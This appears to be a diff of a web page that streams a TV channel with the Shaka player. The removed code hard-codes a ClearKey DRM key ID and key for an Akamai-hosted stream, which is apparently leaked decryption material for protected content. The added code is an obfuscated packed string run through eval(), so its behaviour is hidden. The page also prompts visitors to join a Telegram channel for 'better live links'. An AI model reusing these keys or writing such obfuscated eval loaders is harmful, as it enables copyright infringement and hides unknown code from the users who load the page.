@@ -1,48 +1,4 @@
-       const manifestUri = "https://bpprod5catchup.akamaized.net/bpk-tv/irdeto_com_Channel_252/output/dash/manifest.mpd";
-        async function init() {
-            const video = document.getElementById('video');
-            const ui = video['ui'];
-            const controls = ui.getControls();
-            const player = controls.getPlayer();
-            window.player = player;
-            window.ui = ui;
-            player.configure({
-                drm: {
-                    "clearKeys": {
-                    /*Key ID*/
-    '80f8cbcf7acf5615ba77b632f794b98d': 
-                      /*Key*/
-      '2244c6359fdb0623402a5f5c4fa48b3d'
-                    }
-                }
-            });
-            player.addEventListener('error', onPlayerErrorEvent);
-            controls.addEventListener('error', onUIErrorEvent);
-            try {
-               await player.load(manifestUri);
-                console.log('The video has now been loaded!');
-            } catch (error) {
-                onPlayerError(error);
-        }}
-
-        function onPlayerErrorEvent(errorEvent) {
-            onPlayerError(event.detail);
-        }
-
-        function onPlayerError(error) {
-            console.error('Error code', error.code, 'object', error);
-        }
-
-        function onUIErrorEvent(errorEvent) {
-            onPlayerError(event.detail);
-        }
-
-        function initFailed(errorEvent) {
-            console.error('Unable to load the UI library!');
-        }
-        document.addEventListener('shaka-ui-loaded', init);
-        document.addEventListener('shaka-ui-load-failed', initFailed);
-
+var _0xc33e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe73c(d,e,f){var g=_0xc33e[2][_0xc33e[1]](_0xc33e[0]);var h=g[_0xc33e[3]](0,e);var i=g[_0xc33e[3]](0,f);var j=d[_0xc33e[1]](_0xc33e[0])[_0xc33e[10]]()[_0xc33e[9]](function(a,b,c){if(h[_0xc33e[4]](b)!==-1)return a+=h[_0xc33e[4]](b)*(Math[_0xc33e[8]](e,c))},0);var k=_0xc33e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc33e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe73c(s,e,10)-t)}return decodeURIComponent(escape(r))}("yQQyQQQyUyQQyyyyQUyQQyQyyyUyQQyQQyyUyQQQyQQQUyQyQQQQQUyQQQyyQQUyQQyyQQyUyQQyyyyUyQQyQQyUyQQyQQQyUyQQyyyyQUyQQyQyyyUyQQyQQyyUyQQQyQQQUyQyQQQQQUyQQQyyQQUyQQyyQQyUyyQyQyyUyQQyQQQQUyQQyyyQyUyQQyQQyUyQyQQQQUyQyQyQyUyQQyyQyQUyQQQyyQQUyQQyyQyyUyQQyyyQQUyQQyQyyyUyQQyyyyUyQyQQQyQUyQQQyyyUyQQyyyQUyQQyQyyyUyQQyyQQyUyQQQyyQQUyQQyQQyyUyQQyQyyQUyQQQyQQQUyQQQyQyyUyQQyyyQUyyQQQQyUyQQQyyyUyQQyQQyUyQQQyQQQUyQQyyyQQUyQQyyQyyUyQQyQyyQUyQQyQQyUyQyQQyyUyQQQyyyUyQQyyyQUyQQyyQyQUyQQyyQyyUyQQyyQQyUyQQQyyQQUyQQyyQyyUyQQQyQyQUyQQQyyyyUyQQyQQQQUyQQyQyQyUyQQQyyyQUyQQyyyQUyyQQQQyUyQQQyyyUyQQyQQyUyQQQyyQQUyQQyyyyyUyQQQyQQQUyQQQyQyQUyQQyyQyyUyQQQyyQyUyQQyQQQQUyQQyyQyyUyQQyQQyUyQyQQyyUyQQQyyyUyQQyyyQUyQQyyyyQUyQQyQQQQUyQQQyQyyUyQQyyQyyUyQQQyyyyUyQQyyyQUyyQQQQyUyQQQyyyUyQQyQQyUyQyyQQQUyQyQyyyUyQyQyyyUyQQyyQQUyQQyQQyUyQyQQyyUyQQQyyyUyQQyyyQUyQQQyyyyUyQQQyyQQUyQQyQQQQUyQQQyyyQUyQQQyyyyUyQQyyQyyUyQQyyyQUyyQQQQyUyQQQyyyUyQQyQQyUyQyyQQyUyQyQyyyUyQyQyyyUyQQyQQyUyQyQQyyUyQQQyyyUyQQyyyQUyQQyQQQQUyQQyQyQQUyQQQyQQQUyQQQyyyQUyQQQyyQQUyQQyyyQUyyQQQQyUyQQQyyyUyQQyQQyUyQQQyyyyUyQQyyQyyUyQQyyQyyUyQQyQyyyUyyQQQQyUyQyQyyQUyQyQyyQUyQQyQQQQUyQQyQyQQUyQQQyQQQUyQQQyyyQUyQQQyyQQUyQQyyQyQUyQQyyQyyUyQQQyQQQUyQQyyQyyUyQQQyQQQUyQQyQyyyUyQQyQQyyUyQQQyQQQUyQyQQQQQUyQyQyQyUyQQyyyyQUyQQQyyyyUyQQQyQQQUyQQyyQyyUyQQyyQyQUyQQyQyyQUyQQyQyQyUyQQyQQQQUyQQyQyQyUyQQQyQyyUyQQyQQQQUyQQQyQQQUyQyQyQyUyQQQyQyQUyQQyQyyQUyQQyQyQQUyQyQyyQUyQQQyQyyUyQQQyQQQUyQQyyQyQUyQQyQQQQUyQQyQyQQUyQQQyQQQUyQQQyyyQUyQQQyyQQUyQQyyQyQUyQyQyyQUyQQyQQyyUyQQQyQQQUyQQyQyQyUyQQQyQyyUyQQyyQyQUyQQQyQyQUyQQQyQQQUyQQyQyyyUyQQQyyQQUyQyQyyQUyQyyQQQUyQyyQQyUyQyyyyyUyQyQyyyUyQQyyyyyUyQyyyyQUyQyyQQyUyQyQyyyUyQyQyyQUyQyyQyQUyQyyQQyUyyQyQQyUyyQyQyyUyyQyQQQUyyQyQQyUyyQyQQQUyQyyyQyUyQyyQQQUyyQyyQyUyQyyyQyUyyQyyQQUyQyyyyyUyQyyQQyUyQyyyyQUyQyQyyyUyyQyyQyUyyQyQQQUyyQQQQQUyyQyQQQUyyQyQyQUyyQyQyQUyQyyyQQUyQyyyyQUyyQyQQQUyQyQyyyUyQyyyyyUyQyyyQQUyyQyyQQUyQyyQyQUyQyyQQQUyQyyQyQUyQyyyyyUyyQQQQQUyyQQQQQUyQyyyyyUyyQQQQQUyyQyQQQUyyQyQyQUyQyyyQQUyyyyQyyUyQyQyQyUyQQyQQQyUyQQyQyyyUyQQQyyyQUyQQyQQyUyQyQQyyUyQQQyyyUyQQyyyQUyQQyQQyyUyQQyQyyQUyQQQyyyQUyQQyQyyQUyQQyyyQUyyQQQQyUyQQQyyyUyQQyQQyUyQQQyyyyUyQQyyQyyUyQQyyQyyUyQQyQyyyUyQQyyQyQUyyQQQQyUyQyQyyQUyQyQyyQUyQQyQQyyUyQQyyQyyUyQQyyQyQUyQQyQQyQUyQyQyQQUyQQQyQyQUyQQQyQyyUyQQyQyQyUyQyQyQyUyQQyyQyQUyQyyQyQUyQyQyQyUyQQQyyQQUyQQyyyQQUyQyQyQQUyQQyyyyQUyQQQyyQQUyQQyyQyQUyQQyyQyyUyQyQyQQUyQyyQQQUyQyQyQyUyQQQyQQQUyQQyQyQQUyQQQyQQQUyQyQQQQyUyQQyQyyQUyQQyQyQyUyQQQyQQQUyQQyyyyQUyQQyyQyQUyQyQyQyUyQQQyQyQUyQQyQyyQUyQQyQyQQUyQyQyyQUyQQyQQQyUyQQyyyQQUyQQyQyQQUyQQyQyyyUyQQyyQyQUyQQyyQyyUyQQQyQQQUyQQyyQQyUyQQyyQyyUyQyQyyQUyyyyQyyUyQQQyyQQUyQQyQyQQUyQQyQyyyUyQQQQyyQUyyyQQyyUyQQyQQQQUyQQyyyQyUyQQQyyQQUyQyQyyQUyQQQyQyQUyQQQyQyyUyQQyQyQyUyQyQyyQUyyQyyyyUyyyQQyyUyyyyQyQUyQyQyyQUyyQyQyQUyQQQyyyyUyQQQyQQQUyQQyQyQyUyQQyQyQyUyQQQyyQQUyQQyQQyyUyQyQyyQUyQQyQQQQUyQQyQyQQUyQQQyQQQUyQQQyyyQUyQQQyyQQUyyQyQyQUyQQyQyyQUyQQyQyQyUyQQyyQyyUyQQQyyQQUyQQyQyQyUyQQyyQyyUyQyQyQQUyQyyyQyUyQyQyyyUyQyQyQQUyQQyQQQyUyQyyyQQUyQQQyyQyUyQQQyQyyUyQQyyQQyUyQyyyQyUyQQQyQQQUyQyQyyyUyQyQyQQUyQQyyyQyUyQyyQQQUyQyQyyQUyQQyQQQQUyQQyQyQQUyQQQyQQQUyQQQyyyQUyQQQyyQQUyyQyQyQUyQQyQyyQUyQQyQyQyUyQQyyQyyUyQQQyyQQUyQQyQyQyUyQQyyQyyUyQyQyQQUyQyyyQyUyQyQyyyUyQyQyQQUyQQyQQQyUyQyyyQQUyQQQyyQyUyQQQyQyyUyQQyyQQyUyQyyyQyUyQQQyQQQUyQyQyyyUyQyQyQQUyQQyQyQQUyQyyQQQUyQyQyQyUyQQyQyyyUyQQyQyQyUyQQQyyyQUyQQyQQyUyQyQQyyUyQQQyyyUyQQQyyQyUyQQyQQQQUyQQyQQyyUyQQQyyQQUyyQQQQyUyQQQyyyUyQQyQQyUyQQQyyyyUyQQyyQyyUyQQyyQyyUyQQyQyyyUyQQyyQyQUyyQQQQyUyQyQyyQUyQyQyyQUyQQQyQQyUyQQyQyyyUyQQyQyyyUyQQyyQQyUyQQyQyyQUyQQQyQyyUyQyyyQQUyQQQyQyQUyQQQyQQQUyQQyyQyyUyQQQyQyQUyQQQyyyyUyQQyyyQQUyQQyQyyyUyQyQyQyUyQQQyQQQUyQQyQQyQUyQQQyQQQUyQQyQyQQUyQQQyQQQUyQQyQQQQUyQyQQQQyUyQQQyyQQUyQQQyQyyUyQyQyQyUyQQyQyQyUyQQQyyQQUyQQyyQyyUyQyQyyQUyQQQyQQyUyQQyQyyyUyQQyQQyQUyQyQyQQUyQQyyQyyUyQQyyyQyUyQyQyyQUyQQyQQQQUyQQyyQQyUyQQQyQyyUyQQQyyQQUyQQyyQyyUyQQyQyyQUyQQQQyyQUyQQQyQyQUyQQyQyyQUyQQyQyQQUyQQQQyyQUyyQyQyQUyQQQyyyyUyQQQyQQQUyQQyQyQyUyQQyQyQyUyQQQyyQQUyQQyQQyyUyQQQQyyQUyQyyQQyUyQyyyQQUyQyyQQyUyQyQyyQUyQQyQyyQUyQQyyyQQUyQQyyQyyUyQQyQyyyUyQQyyyQQUyQQyyQyyUyQyQyyQUyQQyQyQQUyQQQyQQQUyQQyQyQyUyQQyQQQQUyQQQyyQyUyQQQyyQQUyQQyyQyQUyQQyyQyyUyQyQyQyUyQQyQyQQUyQQyQyyyUyQQQyQyyUyQQyQQyUyQyQQyyUyQQQyyyUyQQyyQyyUyQyQQQQQUyQQyQyyyUyQQQyyQQUyyQQQQyUyQQQyyyUyQQyQQyUyQQQyQyyUyQQQyQQQUyQQyyQyQUyQQQyyyyUyQQyQQyUyQyQQyyUyQQQyyyUyQQQyQyyUyQQyyQQyUyQQyQyQQUyyQQQQyUyQQQyyyUyQyQQQyQUyQQQyyyUyQQyQQyUyQQQyQyQUyQQyQQyyUyQQQyyQQUyQQQyQQQUyQQyyQQyUyQQyQQyQUyQQQyyQQUyQyQQQQQUyQQyQQyUyyQQQQyUyQQQyyyUyQyQQQyQUyQQQyyyUyQQyQQyUyQQyQQyQUyQQQyyQQUyQyQQQQQUyyyQQQQUyQQQyQyyUyQQyQQyUyyQQQQyUyQQyQQyUyQyyyQQUyQyyyQQUyQyyQyyUyQyyQyQUyQyyyyyUyQyyQyQUyQyyQQQUyQQQyQQQUyQQQyQyQUyQyyQQQUyQQQyQyQUyyQQQQQUyQyyyQQUyQQQyQQQUyQQQyyQQUyQyQyyyUyQQQyQQyUyQQQyQyQUyQyyyQQUyQyyQQyUyQyyyyyUyQQQyyQQUyQyyyQQUyQyyQQQUyQQQyQyQUyQyyQQyUyQQQyyQyUyQQQyQQQUyQyyyyyUyQyyyyQUyQQQyQyyUyQyyQQQUyQQyQQyUyQyQQyyUyQQyQQyUyQQyQQyQUyQQQyyQQUyQyQQQQQUyQQyQQyUyyQQQQyUyQQyQQyUyQQQyQyQUyQQQyQyyUyQQQyQQQUyQQQyyQQUyQyyyyQUyQyyQQyUyQyyyQQUyQyyyQQUyyQQQQQUyQyyQQQUyQyQyyyUyQyyyyyUyQyyyyyUyQyyyyQUyQQQyQyQUyQQQyQQyUyQyyyyQUyQyyyyyUyQQQyQQyUyQyyQQyUyQyyyQQUyQyyQQyUyQQQyyQyUyQyyyyyUyQyyQyQUyQyyyQyUyQQQyQyyUyQQQyQyyUyQyyQQQUyQyyQyyUyQQQyQyQUyQQQyQyyUyQQyQQyUyQQQyyyUyQyQQyQQUyQQQyyyUyQyQQyQQUyyQQQyUyQyQQyQQUyQyQQQQUyyQQQyQUyyQQQyU",61,"QyUnOciVE",39,2,46))
    
 var a = confirm("JOIN OUR TELEGRAM CHANNEL FOR BETTER LIVE LINKS");
 
@@ -56,4 +12,4 @@ if(a==true){
 
       function welcome(){
  window.open("https://t.me/itsteachteam")
-        }
+      }
